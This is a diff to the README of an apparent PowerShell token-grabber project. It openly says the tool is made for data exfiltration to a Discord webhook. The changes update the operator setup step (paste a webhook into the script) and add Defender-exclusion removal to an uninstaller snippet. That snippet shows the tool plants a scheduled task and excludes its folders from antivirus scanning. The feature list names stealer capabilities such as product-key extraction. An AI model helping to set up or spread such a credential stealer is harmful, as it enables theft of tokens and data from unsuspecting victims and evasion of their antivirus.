@@ -9,7 +9,7 @@
    <img src="https://img.shields.io/github/stars/kdot227/Powershell-Token-Grabber.svg?color=yellow">
    <img src="https://img.shields.io/github/forks/kdot227/Powershell-Token-Grabber.svg?color=red">
    <img src="https://img.shields.io/github/issues/kdot227/Powershell-Token-Grabber.svg?color=green">
-   <img src="https://img.shields.io/badge/dynamic/json?label=Visitors&query=value&url=https%3A%2F%2Fapi.countapi.xyz%2Fhit%kdot227%2FPowershell-Token-Grabber">
+   <img src="https://img.shields.io/badge/dynamic/json?label=Visitors&query=value&url=https%3A%2F%2Fapi.countapi.xyz%2Fhit%2FKDot227%2FPowerShell-Token-Grabber">
    <br>
    <img src="https://img.shields.io/github/last-commit/kdot227/Powershell-Token-Grabber">
    <img src="https://img.shields.io/github/license/kdot227/Powershell-Token-Grabber">
@@ -24,7 +24,7 @@ This tool is made for data exfiltration. All information collected is sent using
 # Usage
 
 - Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
-- Replace YOUR_WEBHOOK_HERE in [line 30](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L30) with your webhook.
+- Replace YOUR_WEBHOOK_HERE in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
 
 
 
@@ -51,13 +51,15 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] List TCP Connections and Underlying Process
 - [x] Extracts Product Key
  
-## Uninstaller (Removes the Scheduled Task and Script Folder)
+## Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
 - Open a new Elevated Powershell Console and Paste the Contents below
 ```ps1
 $ErrorActionPreference = "SilentlyContinue"
 function Cleanup {
   Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
   Remove-Item -Path "$env:appdata\KDOT" -force -recurse
+  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
+  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
   Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
 }
 Cleanup
